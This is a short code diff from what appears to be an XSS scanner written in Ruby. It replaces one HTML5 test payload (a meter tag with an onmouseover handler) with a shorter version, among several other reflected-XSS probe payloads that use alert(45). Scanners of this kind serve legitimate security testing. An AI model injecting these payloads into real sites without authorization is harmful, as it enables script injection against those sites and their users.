@@ -400,7 +400,7 @@ class XspearScan
     r.push makeQueryPattern('x', '"\'><details/open/ontoggle="alert`45`">', '<details/open/ontoggle="alert`45`">', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
     r.push makeQueryPattern('x', '"\'><audio src onloadstart=alert(45)>', '<audio src onloadstart=alert(45)>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
     r.push makeQueryPattern('x', '"\'><marquee onstart=alert(45)>', '<marquee onstart=alert(45)>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
-    r.push makeQueryPattern('x', '"\'><meter value=2 min=0 max=10 onmouseover=alert(45)>2 out of 10</meter>', '<meter value=2 min=0 max=10 onmouseover=alert(45)>2 out of 10</meter>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
+    r.push makeQueryPattern('x', '"\'><meter onmouseover=alert(45)>0</meter>', '<meter onmouseover=alert(45)>0</meter>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
 
     onfocus_tags.each do |t|
       r.push makeQueryPattern('x', "\"'><#{t} autofocus onfocus=alert(45)>", "<#{t} autofocus onfocus=alert(45)>", 'h', "reflected "+"onfocus XSS Code".red, CallbackStringMatch)
